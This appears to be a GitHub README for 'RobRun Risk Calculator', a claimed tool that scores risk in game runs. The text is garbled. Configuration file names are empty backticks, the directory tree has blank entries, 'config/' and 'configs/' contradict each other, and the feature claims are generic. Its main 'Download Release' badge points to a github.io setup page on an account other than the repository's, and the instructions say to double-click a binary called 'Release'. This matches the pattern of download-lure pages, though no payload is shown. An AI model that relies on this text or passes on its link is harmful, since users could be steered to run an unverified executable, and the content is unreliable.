# RobRun Risk Calculator

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download-Release-ea580c?style=flat-square&logo=npm&logoColor=white" alt="Download">
  </a>
  <a href="https://github.com/Crestoushovel/RobRun-Risk-Calculator">
    <img src="https://img.shields.io/badge/Repository-Read%20me-red?style=for-the-badge&logo=github&logoColor=white" alt="Repository">
  </a>
  <a href="https://github.com/Crestoushovel/RobRun-Risk-Calculator/releases">
    <img src="https://img.shields.io/badge/Version-1.2.0-blue?style=plastic&logo=appveyor&logoColor=white" alt="Version">
  </a>
  <a href="https://github.com/Crestoushovel/RobRun-Risk-Calculator/issues">
    <img src="https://img.shields.io/badge/Issues-Open-green?style=flat&logo=github&logoColor=white" alt="Issues">
  </a>
  <a href="https://github.com/Crestoushovel/RobRun-Risk-Calculator/blob/main/docs">
    <img src="https://img.shields.io/badge/Docs-Complete-yellow?style=flat-square&logo=readthedocs&logoColor=black" alt="Docs">
  </a>
</div>

---

## What Is RobRun Risk Calculator?

RobRun Risk Calculator is a lightweight, cross‑platform companion that transforms raw run data into actionable risk metrics. By parsing configuration profiles and applying a library of workflow presets, it delivers a concise risk score, visual heat‑maps, and a set of recommendations tailored to each playthrough. The project focuses on transparency and reproducibility, making it easy to integrate into existing pipelines or use as a standalone reference.

---

## Core Features

- **Structured Profile Support** – Load any of the four official configuration files (``, ``, ``, ``) and map them to the risk engine.
- **Preset‑Driven Analytics** – A collection of pre‑configured workflows (e.g., “Aggressive Build”, “Stealth Run”, “Resource‑Heavy Sprint”) that adjust weighting factors and thresholds automatically.
- **Risk Heat‑Map** – A color‑coded grid that highlights high‑risk zones within the run map, enabling rapid visual assessment.
- **Export Options** – Generate CSV, JSON, or plain text summaries that can be fed into external dashboards or shared with teammates.
- **Cross‑Platform Compatibility** – Works on Windows, macOS, and Linux without additional dependencies beyond the bundled runtime.

---

## Workflow Presets

| Preset | Description | Typical Use‑Case |
|--------|-------------|------------------|
| `Aggressive` | Prioritizes speed over safety. | Quick clearance runs. |
| `Stealth` | Minimizes visible damage and noise. | Exploration with high risk tolerance. |
| `Resource` | Focuses on resource gathering while managing risk. | Long‑haul expeditions. |
| `Balanced` | Evenly distributes risk factors. | All‑purpose runs. |

To apply a preset, specify its name in the `` under `[Overrides]`:

```
preset=Stealth
```

---

## Using the Calculator

1. **Place Configuration**
   Copy the desired `.cfg` files into the `config/` directory adjacent to the executable.

2. **Select a Run File**
   Load the run data file (JSON or CSV) by placing it in the `data/` folder. The calculator automatically scans for the first file it finds.

3. **Execute**
   Double‑click `Release` (Windows) or run `./RobRunRiskCalc` (Linux/macOS). The terminal will display a progress bar, then output the final risk score.

4. **Review Heat‑Map**
   The application opens a lightweight window showing the heat‑map. Hover over cells for exact values.

5. **Export**
   Use the `--export` flag to produce a report. For example, `RobRunRiskCalc --export summary.csv`. The flag is optional; reports are generated automatically in the `reports/` directory if no flag is supplied.

---

## Directory Structure

```
RobRun-Risk-Calculator/
├─ bin/
│  └─ Release
├─ config/
│  ├─
│  ├─
│  ├─
│  └─
├─ data/
│  └─ run_sample.json
├─ docs/
│  ├─ README.md
│  └─ usage_guide.md
├─ reports/
│  └─ latest_report.json
├─ LICENSE
└─ .gitignore
```

---

## FAQ & Troubleshooting

| Question | Answer |
|----------|--------|
| *The calculator fails to detect my run file.* | Verify that the file is in `data/` and has an extension of `.json` or `.csv`. Ensure no hidden characters in the filename. |
| *Heat‑Map colors look off.* | Check that `` contains the `[UI]` section and that the `heatmap_color_scheme` value matches one of the supported themes (`default`, `dark`, `light`). |
| *Exported CSV is missing columns.* | Confirm that the `--export` flag includes the `--format csv` parameter. The default export is JSON; CSV requires explicit instruction. |
| *Risk score feels too low.* | Increase thresholds in `` or adjust the preset to a more conservative one. |
| *How do I create a new preset?* | Add a new section in `` under `[Overrides]` and define weight multipliers for each risk factor. The application will read and apply them automatically. |

---

## Contributing

All contributions are welcome. Please read the contributing guidelines in `docs/usage_guide.md` before submitting a pull request. When submitting, remember:

- Keep changes localized to a single feature or bug.
- Update the README if you add new presets or alter configuration options.
- Add or modify the FAQ if your change introduces new edge cases.

---

## License

RobRun Risk Calculator is distributed under the MIT License. See the `LICENSE` file for full details.

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```